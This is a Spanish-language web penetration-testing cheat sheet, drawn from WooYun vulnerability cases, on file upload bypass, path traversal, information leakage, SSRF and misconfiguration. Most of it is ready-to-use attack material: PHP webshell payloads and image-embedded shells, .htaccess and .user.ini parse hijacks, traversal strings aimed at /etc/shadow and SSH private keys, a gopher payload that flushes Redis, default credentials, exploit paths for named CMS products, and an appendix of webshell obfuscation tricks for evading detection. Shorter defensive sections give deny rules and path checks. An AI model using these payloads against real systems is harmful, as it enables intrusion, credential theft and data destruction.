# Seguridad de Archivos e Infraestructura Web

> **Fuente**: Basado en 88,636 casos reales de vulnerabilidades de la base de datos WooYun, abarca tres grandes áreas: subida de archivos (2,711 casos), recorrido/descarga de archivos (50 casos con análisis profundo) y fuga de información (7,337 casos).
> **Metodología**: Fórmula de esencia de vulnerabilidad WooYun + marco de análisis sistemático estilo INTJ

---

## Uno. Vulnerabilidades de subida de archivos

### 1.1 Esencia de la vulnerabilidad

```
Cadena de ataque: descubrimiento del punto de subida → bypass de detección → obtención de la ruta → explotación del parseo → ejecución de Webshell
Tasa de éxito = P(bypass de detección) × P(obtención de ruta) × P(parseo y ejecución)
```

Contradicción central: necesidad funcional (permitir la subida) vs. necesidad de seguridad (restringir la ejecución). La mayoría de las defensas solo se enfocan en "evadir la detección", ignorando la fuga de rutas y la configuración de parseo.

### 1.2 Identificación de puntos de subida

| Tipo de punto de subida | Frecuencia | Riesgo | Ruta típica |
|-----------|------|------|---------|
| Editor de texto enriquecido | 42% | Muy alto | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| Subida de avatar | 18% | Alto | `/upload/avatar/`, `/member/uploadfile/` |
| Adjuntos/documentos | 15% | Alto | `/uploads/`, `/attachment/` |
| Funciones de administración | 12% | Muy alto | `/admin/upload/`, `/system/upload/` |
| Función de importación | 5% | Alto | `/import/`, `/excelUpload/` |

Rutas de prueba de editores:

| Editor | Ruta de prueba | Interfaz de subida |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 Técnicas de bypass - Extensión

Referencia rápida de bypass de lista negra:

| Técnica | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| Mayúsculas/minúsculas | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| Doble escritura | `.pphphp` | `.asaspp` | `.jsjspp` |
| Sufijos especiales | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| Espacio/punto | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| Truncamiento %00 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| Punto y coma (IIS) | N/A | `.asp;.jpg` | N/A |
| Salto de línea (Apache) | `.php\x0a` | N/A | N/A |

Métodos de bypass de lista blanca:

| Técnica | Principio | Condición |
|-----|------|------|
| Vulnerabilidad de parseo | Se sube un archivo de la lista blanca pero es parseado de forma especial | Vulnerabilidad de IIS/Apache/Nginx |
| Múltiples sufijos en Apache | `shell.php.jpg` se interpreta como php | Configuración de múltiples sufijos en Apache |
| Truncamiento %00 | `shell.php%00.jpg` | PHP < 5.3.4 |
| Subida de archivo de configuración | Subir `.htaccess`/`.user.ini` | Se permite txt/archivos de configuración |
| Imagen con shell + LFI | Subir imagen con shell combinado con inclusión de archivos | Existe vulnerabilidad LFI |

### 1.4 Técnicas de bypass - MIME/Content-Type

```
Modificar el Content-Type a los siguientes valores permite el bypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (genérico)

Ejemplo de modificación interceptando con Burp:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Punto clave de modificación
```

### 1.5 Técnicas de bypass - Detección de cabecera/contenido de archivo

Números mágicos (Magic Number) comunes de archivos:

| Tipo | Magic Number (Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | Sin ASCII legible |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Creación de imagen con shell:

```bash
# Método 1: agregar simplemente la cabecera de archivo
GIF89a<?php system($_POST['cmd']); ?>

# Método 2: fusionar archivos
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# Método 3: inyección EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Vulnerabilidades de parseo del servidor Web

```
IIS 5.x/6.0:
  Parseo de directorio: /shell.asp/1.jpg     -> interpretado como ASP
  Parseo de archivo: shell.asp;.jpg          -> interpretado como ASP
  Parseo malformado: shell.asp.jpg           -> puede interpretarse como ASP

Apache:
  Múltiples sufijos: shell.php.xxx           -> se interpreta de derecha a izquierda
  .htaccess: AddType application/x-httpd-php .jpg
  Parseo con salto de línea: shell.php%0a    -> CVE-2017-15715

Nginx:
  Parseo malformado: /1.jpg/shell.php        -> cgi.fix_pathinfo=1
  Byte nulo: shell.jpg%00.php                -> vulnerabilidad en versiones antiguas

Tomcat:
  Método PUT: PUT /shell.jsp/                -> CVE-2017-12615
```

### 1.7 Secuestro de parseo mediante archivos de configuración

```apache
# .htaccess: hacer que jpg sea interpretado como PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): incluir automáticamente la imagen con shell
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): hacer que jpg sea procesado por FastCGI -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Explotación de condiciones de carrera

```
Principio: existe un desfase temporal entre la subida y el borrado del archivo
Explotación: subida y acceso multihilo, ejecutar código malicioso antes del borrado
Técnica: el archivo malicioso primero genera un nuevo archivo en otra ubicación que no es eliminado por el mecanismo de limpieza
```

### 1.9 Medidas de defensa

1. Validación por lista blanca: permitir solo extensiones específicas (`.jpg .png .gif .pdf`)
2. Validación multicapa: extensión + MIME (finfo_file) + cabecera de archivo + getimagesize()
3. Renombrado de archivos: `uniqid() + extensión fija`, eliminando por completo el nombre original
4. Prohibir ejecución: el directorio de subida debe prohibir permisos de ejecución de scripts
5. Mínimo privilegio: `chmod 0644`, el usuario Web no debe poder ejecutar
6. Verificar antes de guardar: validar primero y luego almacenar, usar operaciones atómicas para evitar condiciones de carrera
7. Ocultar rutas: no devolver la ruta completa, usar CDN o URLs aleatorizadas

---

## Dos. Recorrido de archivos e inclusión de archivos

### 2.1 Esencia de la vulnerabilidad

```
Espacio de entrada del usuario -> [falla del límite de confianza] -> espacio del sistema de archivos
Núcleo: el desarrollador asume que "entrada del usuario = nombre de archivo", el atacante explota que "entrada del usuario = instrucción de ruta"
```

### 2.2 Identificación de parámetros vulnerables

Nombres de parámetros de alta frecuencia (por frecuencia de aparición):

```
Tipo archivo: filename, filepath, path, file, filePath, hdfile, inputFile
Tipo descarga: download, down, attachment, attach, doc
Tipo lectura: read, load, get, fetch, open, input
Tipo plantilla: template, tpl, page, include, temp
Tipo genérico: url, src, dir, folder, resource, name
```

Puntos funcionales de alto riesgo (TOP 5):
1. Interfaz de descarga de archivos (27 casos) - `down.php, download.jsp`
2. Función de vista previa de archivos (17 casos) - `view.php, preview.jsp`
3. Gestión de adjuntos (6 casos) - `attachment.php`
4. Carga de imágenes (5 casos) - `pic.php, image.jsp`
5. Visualización de logs (4 casos) - `log.php, viewlog.jsp`

### 2.3 Payload de recorrido de directorios

Recorrido básico:

```bash
../                          # estándar Linux
..\..\                       # estándar Windows
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Bypass mediante codificación:

```bash
# codificación URL simple
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# doble codificación URL
%252e%252e%252f  |  ..%252f

# codificación extendida Unicode/UTF-8 (específico de GlassFish)
%c0%ae%c0%ae/%c0%af

# codificación mixta
..%2f  |  %2e%2e/  |  ..%c0%af
```

Bypass especiales:

```bash
# truncamiento con byte nulo (PHP<5.3.4 / versiones antiguas de Java)
../../../etc/passwd%00.jpg

# truncamiento con signo de interrogación
../../../WEB-INF/web.xml%3f

# ofuscación de ruta
....//  |  ....\/  |  ..\/  |  ./../../

# ruta absoluta/bypass de protocolo
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Referencia rápida de rutas de archivos sensibles

Sistema Linux:

```bash
/etc/passwd                    # lista de usuarios (opción preferida para verificación)
/etc/shadow                    # hashes de contraseñas
/etc/hosts                     # mapeo de hosts
/root/.ssh/id_rsa              # clave privada SSH
/root/.bash_history            # historial de comandos
/proc/self/environ             # variables de entorno del proceso
/etc/nginx/nginx.conf          # configuración de Nginx
/etc/my.cnf                    # configuración de MySQL
```

Sistema Windows:

```bash
C:\windows\win.ini             # configuración del sistema (opción preferida para verificación)
C:\boot.ini                    # configuración de arranque (XP/2003)
C:\inetpub\wwwroot\web.config  # configuración de aplicación IIS
C:\windows\system32\config\sam # base de datos SAM
```

Java Web:

```bash
WEB-INF/web.xml                         # configuración central (opción preferida para verificación)
WEB-INF/classes/jdbc.properties          # configuración de base de datos
WEB-INF/classes/applicationContext.xml   # configuración de Spring
WEB-INF/classes/hibernate.cfg.xml        # configuración de Hibernate
```

Aplicaciones PHP:

```bash
config.php | config.inc.php | db.php | conn.php    # configuración genérica
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # configuración central (incluye cadena de conexión)
../web.config              # configuración del directorio superior
```

### 2.5 Medidas de defensa

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Normalización de ruta
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Verificar que esté dentro del directorio permitido
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Extensión de lista blanca
    # 4. Verificar existencia del archivo
    return full_path
```

Principio clave: normalización de ruta (realpath/normpath) -> validación del límite del directorio -> validación por lista blanca -> ejecución con privilegio mínimo

---

## Tres. Fuga de información

### 3.1 Esencia de la vulnerabilidad

```
Esencia de la fuga de información: exposición de la superficie de ataque -> ruptura de la cadena de confianza -> penetración en profundidad
Patrón: un solo punto de fuga puede provocar el colapso de toda la cadena de confianza
      código fuente -> configuración -> base de datos -> red interna -> compromiso total
```

### 3.2 Diccionario de rutas de archivos sensibles

Fuga de control de versiones:

```bash
# fuga de Git (máxima prioridad de detección)
/.git/config          # contiene dirección del repositorio remoto
/.git/HEAD            # rama actual
/.git/index           # índice del área de staging
/.git/logs/HEAD       # registro de operaciones

# fuga de SVN
/.svn/entries         # SVN 1.6 y anteriores
/.svn/wc.db           # base de datos SQLite de SVN 1.7+

# herramientas de explotación: dvcs-ripper, GitHack, svn-extractor
```

Fuga de archivos de respaldo:

```bash
# respaldo comprimido (530 casos detectados)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# respaldo SQL (136 casos detectados)
/backup.sql | /database.sql | /db.sql | /dump.sql

# respaldo de configuración (101 casos detectados)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

Fuga de archivos de configuración:

```bash
# genérico
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

Archivos de sondeo/depuración/log:

```bash
# archivos de sondeo
/phpinfo.php | /info.php | /test.php | /probe.php

# archivos de log
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# interfaz de administración
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 Metodología de sondeo

```
Fase 1 recolección pasiva: encabezados de respuesta (Server/X-Powered-By) -> página de error -> robots.txt -> comentarios en código fuente/JS
Fase 2 sondeo dirigido: control de versiones (.git/.svn) -> archivos de respaldo (dominio/fecha) -> rutas sensibles
Fase 3 motores de búsqueda: sintaxis de Google Hacking
```

Referencia rápida de Google Hacking:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 Cadena de explotación de información

```
Fuga de código fuente   -> archivo de configuración -> credenciales de BD -> toma de control de BD -> escalada en el servidor
Control de versiones    -> auditoría de código -> SQLi, etc.  -> privilegios de admin   -> getshell mediante subida de archivo
Fuga de configuración   -> cadena de conexión BD -> base de datos    -> datos de usuario   -> toma de control del negocio
Fuga de logs            -> Session  -> secuestro de identidad  -> datos del negocio   -> movimiento lateral
Interfaz API            -> credenciales/contraseñas -> descifrado     -> control masivo   -> penetración total
Credenciales de terceros -> SMS/OSS -> código de verificación    -> toma de control de cuenta   -> fuga de datos
```

### 3.5 Medidas de defensa

Configuración segura de Nginx:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

Configuración segura de Apache:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

Integración CI/CD: escanear archivos sensibles antes del despliegue -> prohibir el despliegue de .git/.svn -> cifrar archivos de configuración

---

## Cuatro. SSRF y explotación de protocolos

### 4.1 Esencia de la vulnerabilidad

```
Esencia del SSRF: el servidor realiza la petición en nombre del atacante, quien controla el destino de la petición
Riesgo: sondeo de red interna -> acceso a servicios internos -> lectura de archivos -> ejecución de comandos
```

### 4.2 Puntos de activación comunes

- Parámetro url en funciones de descarga de archivos
- Carga de imágenes/funciones de proxy
- Funciones de vista previa de páginas web/captura de pantalla
- Función de importación por URL
- Configuración de Webhook/callback

### 4.3 Explotación de protocolos

```bash
# file:// - lectura arbitraria de archivos
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - sondeo de puertos/interacción con servicios
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - construcción de peticiones TCP arbitrarias
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - sondeo de red interna
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # metadatos de la nube
```

### 4.4 Técnicas de bypass

```bash
# ofuscación de IP
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS rebinding: resolver a una IP externa y luego cambiar rápidamente a 127.0.0.1
# enlaces cortos/redirección 302: redirigir a una dirección interna a través de una URL externa
```

### 4.5 Medidas de defensa

1. Restricción por lista blanca: limitar dominios/IPs de destino de la petición
2. Restricción de protocolo: permitir solo http/https
3. Aislamiento de red interna: prohibir peticiones a direcciones RFC1918 y 127.0.0.1
4. Validación de resolución DNS: verificar nuevamente la pertenencia de la IP tras la resolución
5. Deshabilitar redirecciones: o limitar el número de redirecciones y validar nuevamente

---

## Cinco. Errores de configuración del servidor

### 5.1 Errores de configuración de parseo

| Problema | Riesgo | Método de verificación |
|-----|------|---------|
| Vulnerabilidad de parseo de IIS 6.0 sin corregir | `shell.asp;.jpg` puede ejecutarse | probar subiendo un nombre de archivo con punto y coma |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` se interpreta como PHP | subir imagen y acceder a `/img.jpg/x.php` |
| Parseo de múltiples sufijos en Apache | `shell.php.xxx` es interpretado | probar subiendo un archivo con doble extensión |
| Scripts ejecutables en el directorio de subida | Webshell se ejecuta directamente | probar subiendo un archivo de script |
| Listado de directorios habilitado | expone todos los archivos | acceder a la URL del directorio para verificar |

### 5.2 Errores de configuración de permisos

| Problema | Riesgo | Corrección |
|-----|------|------|
| Proceso Web ejecutándose con privilegios altos | escalada directa a root | ejecutar con un usuario de bajo privilegio |
| Directorio de subida con permisos 777 | escritura y ejecución arbitraria | establecer 644/755 |
| Archivo de configuración legible | fuga de credenciales | moverlo fuera del directorio Web, restringir permisos |
| Panel de administración sin restricción de IP | accesible desde internet público | lista blanca de IP/VPN |

### 5.3 Riesgos de configuración predeterminada

```bash
# rutas de panel de administración predeterminadas
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# credenciales predeterminadas (alta frecuencia)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# puertos de depuración predeterminados
8080 (Tomcat) | 9090 (administración) | 3306 (MySQL expuesto a internet)
6379 (Redis sin contraseña) | 27017 (MongoDB sin autenticación)
```

### 5.4 Fuga de Spring Boot Actuator

```bash
/actuator/env          # variables de entorno (incluye contraseñas)
/actuator/configprops  # propiedades de configuración
/actuator/heapdump     # volcado de memoria heap (contiene datos sensibles)
/actuator/mappings     # todos los mapeos de URL
```

---

## Seis. Checklist integral de práctica

### 6.1 Prueba de subida de archivos

- [ ] Escanear rutas de editores comunes (FCKeditor/eWebEditor/UEditor)
- [ ] Deshabilitar JavaScript para probar la validación del frontend
- [ ] Probar bypass de extensión: mayúsculas/minúsculas, doble escritura, sufijos especiales, truncamiento %00, truncamiento con punto y coma
- [ ] Modificar Content-Type a image/jpeg
- [ ] Agregar cabecera GIF89a / crear imagen con shell
- [ ] Identificar el tipo de servidor, probar la vulnerabilidad de parseo correspondiente
- [ ] Probar secuestro de parseo mediante subida de .htaccess/.user.ini
- [ ] Analizar la regla de nombrado de archivos, probar fuerza bruta de ruta
- [ ] Probar subida con condición de carrera

### 6.2 Prueba de recorrido de archivos

- [ ] Identificar parámetros relacionados con archivos (filename/path/file/url/download)
- [ ] Recorrido básico: `../../../../../etc/passwd`
- [ ] Prueba en Windows: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] Bypass por codificación URL: `%2e%2e%2f` / doble codificación `%252e%252e%252f`
- [ ] Bypass Unicode: `%c0%ae%c0%ae/`
- [ ] Truncamiento con byte nulo: `../etc/passwd%00.jpg`
- [ ] Ruta absoluta: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Escaneo de fuga de información

- [ ] Control de versiones: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Archivos de respaldo: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Respaldo de configuración: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Archivos de entorno: `/.env` `/.env.production`
- [ ] Archivos de sondeo: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Archivos de log: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Interfaz de administración: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Búsqueda asistida con sintaxis Google Hacking

### 6.4 Prueba de SSRF

- [ ] Identificar parámetros de URL/proxy/callback
- [ ] Probar lectura vía protocolo file:///etc/passwd
- [ ] Probar direcciones de red interna: http://127.0.0.1:port
- [ ] Metadatos de la nube: http://169.254.169.254/latest/meta-data/
- [ ] Bypass por ofuscación de IP: notación hexadecimal/decimal/abreviada
- [ ] Bypass mediante DNS rebinding/redirección 302

---

## Apéndice A: Referencia rápida de vulnerabilidades de CMS de alto riesgo

| CMS/Sistema | Tipo de vulnerabilidad | Ruta | Condición |
|---------|---------|------|------|
| Wanhu OA ezOffice | Subida arbitraria | `/defaultroot/dragpage/upload.jsp` | truncamiento %00 |
| Yonyou Collaboration Platform | Subida arbitraria | `/oaerp/ui/sync/excelUpload.jsp` | evadir JS + fuerza bruta de nombre de archivo |
| Kingdee GSiS | Subida arbitraria | `/kdgs/core/upload/upload.jsp` | usuario registrado |
| Jinzhi Education epstar | Recorrido de archivos | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | sin necesidad de autenticación |
| Zhiyuan OA | Fuga de log | `/ctp.log` | acceso directo |

## Apéndice B: Referencia rápida de técnicas de evasión de Webshell

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // concatenación de variable
array_map('ass'.'ert', array($_POST['x']));            // función callback
$f = create_function('', $_POST['x']); $f();           // función dinámica
set_exception_handler('system');                        // manejador de excepciones
throw new Exception($_POST['cmd']);
```

## Apéndice C: Patrones de URL de vulnerabilidad genéricos

```bash
# recorrido de archivos en PHP
/down.php?filename=../../../etc/passwd
/pic.php?url=[ruta codificada en base64]

# recorrido de archivos en JSP
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# recorrido de archivos en ASP/ASPX
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# específico de Resin
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Cadena de suministro/despliegue en la nube/CVE de frameworks** → migrado a [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP smuggling/WebSocket/OAuth** → migrado a [web-modern-protocols.md](web-modern-protocols.md)

*Basado en la base de vulnerabilidades WooYun (88,636 registros) | Solo para investigación de seguridad y referencia defensiva*
